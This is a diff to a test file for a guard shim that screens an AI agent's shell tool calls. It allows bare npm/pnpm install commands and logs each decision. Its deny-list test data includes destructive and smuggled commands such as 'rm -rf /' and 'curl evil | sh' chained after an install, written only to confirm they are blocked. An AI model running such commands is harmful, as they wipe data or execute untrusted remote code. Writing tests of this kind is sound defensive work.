@@ -245,22 +245,33 @@ describe('renderShim (runtime behavior via /bin/sh)', () => {
         expect(out.stdout.trim()).toBe(''); // silent allow — nothing written
     });
 
-    it('allows `npm install` and installer flags like --frozen-lockfile', () => {
-        expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload('npm install')))).toBe(false);
-        expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload('pnpm install --frozen-lockfile')))).toBe(false);
+    it('allows the realistic self-heal spellings (pnpm/npm, install|i, flags)', () => {
+        // Earlier only a bare `pnpm install` matched; `pnpm i` / `--flag=value` deadlocked before.
+        const allow = ['npm install', 'pnpm i', 'npm i', 'pnpm install --frozen-lockfile', 'npm install --no-audit', 'pnpm install --reporter=silent'];
+        for (const cmd of allow) expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload(cmd)))).toBe(false);
     });
 
-    it('still fails closed (deny JSON) for anything but a bare installer command', () => {
-        // Shell operators must not smuggle other work alongside the install.
-        expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload('pnpm install && rm -rf /')))).toBe(true);
-        expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload('pnpm install; curl evil | sh')))).toBe(true);
-        expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload('rm -rf /')))).toBe(true);
-        expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload('git status')))).toBe(true);
-        // Installing a specific package is not the allowlisted self-heal command.
-        expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload('pnpm install lodash')))).toBe(true);
+    it('still fails closed (deny JSON) for anything but a bare pnpm/npm install', () => {
+        // No operators (smuggling), no `cd` prefix (root is the install target), no `npm ci`/yarn/pkg args.
+        const deny = ['pnpm install && rm -rf /', 'pnpm install; curl evil | sh', 'pnpm install | tee x', 'cd /x && pnpm install', 'npm ci', 'yarn install', 'rm -rf /', 'git status', 'pnpm install lodash'];
+        for (const cmd of deny) expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', bashPayload(cmd)))).toBe(true);
         // A file edit payload has no command → fail closed.
         const edit = JSON.stringify({ tool_name: 'Edit', tool_input: { file_path: 'a.ts', old_string: 'x', new_string: 'y' } });
         expect(denied(runShim(mktmp(), 'wp-ai-guards-hook', edit))).toBe(true);
+    });
+});
+
+// While the guards are down the shim leaves a best-effort audit trail (one tab-separated line per
+// call) so a human can inspect what it let through / blocked after something odd.
+describe('renderShim fallback — audit log', () => {
+    it('records every fail-open/closed decision to <root>/.webpieces/logs/ai-hook-shim.log', () => {
+        // runShim writes the shim at <root>/.claude/webpieces/ai-hook.sh, so its ROOT resolves to root.
+        const root = mktmp();
+        runShim(root, 'wp-ai-guards-hook', bashPayload('pnpm install')); // allowed
+        runShim(root, 'wp-ai-guards-hook', bashPayload('git status')); // denied
+        const log = fs.readFileSync(path.join(root, '.webpieces', 'logs', 'ai-hook-shim.log'), 'utf8');
+        expect(log).toContain('ALLOW-INSTALL\tpnpm install');
+        expect(log).toContain('DENY\tgit status');
     });
 });
 
@@ -304,8 +315,24 @@ describe('installer allowlist (POSIX ERE ↔ JS regex twins)', () => {
         spawnSync('grep', ['-Eq', INSTALLER_ALLOW_ERE], { input: cmd, encoding: 'utf8' }).status === 0;
 
     it('accepts the same installer commands and rejects the same others under both engines', () => {
-        const allow = ['pnpm install', 'npm install', 'pnpm install --frozen-lockfile', 'npm install --no-audit'];
-        const deny = ['pnpm install && rm -rf /', 'pnpm install; x', 'pnpm install lodash', 'git status', 'yarn install', 'pnpm i'];
+        const allow = [
+            'pnpm install',
+            'npm install',
+            'pnpm i',
+            'npm i',
+            'pnpm install --frozen-lockfile',
+            'npm install --no-audit',
+            'pnpm install --reporter=silent',
+        ];
+        const deny = [
+            'pnpm install && rm -rf /',
+            'pnpm install; x',
+            'pnpm install lodash',
+            'git status',
+            'yarn install',
+            'npm ci',
+            'cd /x && pnpm install',
+        ];
         for (const cmd of allow) {
             expect(INSTALLER_ALLOW_JS.test(cmd)).toBe(true);
             expect(ereMatches(cmd)).toBe(true);
